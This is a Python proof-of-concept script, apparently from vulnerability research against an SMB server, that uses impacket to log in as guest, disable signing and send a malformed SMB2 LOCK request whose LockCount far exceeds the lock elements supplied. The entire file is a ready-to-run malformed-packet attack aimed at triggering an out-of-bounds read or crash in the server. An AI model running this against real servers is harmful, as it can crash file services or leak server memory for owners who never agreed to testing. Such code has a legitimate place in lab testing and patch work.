#!/usr/bin/env python3
"""Send an SMB2 LOCK whose LockCount exceeds the supplied element array."""

import argparse
import struct
import time

from impacket.smb3 import SMB3
from impacket.smb3structs import (
    FILE_ATTRIBUTE_NORMAL,
    FILE_NON_DIRECTORY_FILE,
    FILE_OPEN_IF,
    FILE_SHARE_DELETE,
    FILE_SHARE_READ,
    FILE_SHARE_WRITE,
    GENERIC_ALL,
    SMB2_LOCK,
)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="192.168.64.81")
    parser.add_argument("--share", default="smbtest")
    parser.add_argument("--user", default="guest")
    parser.add_argument("--password", default="")
    parser.add_argument("--count", type=lambda value: int(value, 0), default=0xFFFF)
    parser.add_argument("--pad-size", type=lambda value: int(value, 0), default=0)
    parser.add_argument("--pad-flags", type=lambda value: int(value, 0), default=4)
    parser.add_argument("--timeout", type=float, default=10.0)
    args = parser.parse_args()

    if not 1 <= args.count <= 0xFFFF:
        raise ValueError("count must fit the SMB2 LockCount u16 field")
    if args.pad_size < 0 or args.pad_size % 24:
        raise ValueError("pad-size must be a non-negative multiple of 24")
    if args.pad_size // 24 >= args.count:
        raise ValueError("pad-size must supply fewer elements than LockCount")
    if not 0 <= args.pad_flags <= 0xFFFFFFFF:
        raise ValueError("pad-flags must fit the SMB2 lock-element u32 field")

    client = SMB3("*SMBSERVER", args.host, timeout=args.timeout)
    client.login(args.user, args.password)
    if client.isGuestSession():
        client._Session["SigningActivated"] = False

    tree_id = client.connectTree(args.share)
    filename = f"codex_lock_count_{int(time.time())}.bin"
    file_id = client.create(
        tree_id,
        filename,
        GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        FILE_NON_DIRECTORY_FILE,
        FILE_OPEN_IF,
        FILE_ATTRIBUTE_NORMAL,
    )

    # The 24-byte fixed prefix is present, but no 24-byte lock elements follow.
    request = struct.pack("<HHI16s", 48, args.count, 0, bytes(file_id))
    element = struct.pack("<QQII", 0, 0, args.pad_flags, 0)
    request += element * (args.pad_size // len(element))
    packet = client.SMB_PACKET()
    packet["Command"] = SMB2_LOCK
    packet["TreeID"] = tree_id
    packet["Data"] = request
    print(
        f"connected host={args.host} share={args.share} file={filename} "
        f"lock_count={args.count:#x} supplied_elements={args.pad_size // 24} "
        f"pad_flags={args.pad_flags:#x} "
        f"request_size={len(request):#x}",
        flush=True,
    )

    try:
        packet_id = client.sendSMB(packet)
        response = client.recvSMB(packet_id)
        print(
            f"LOCK response status={int(response['Status']):#x} "
            f"data_len={len(response['Data'])}",
            flush=True,
        )
    except Exception as error:
        print(f"LOCK result: {type(error).__name__}: {error}", flush=True)

    try:
        client.close(tree_id, file_id)
    except Exception as error:
        print(f"close result: {type(error).__name__}: {error}", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
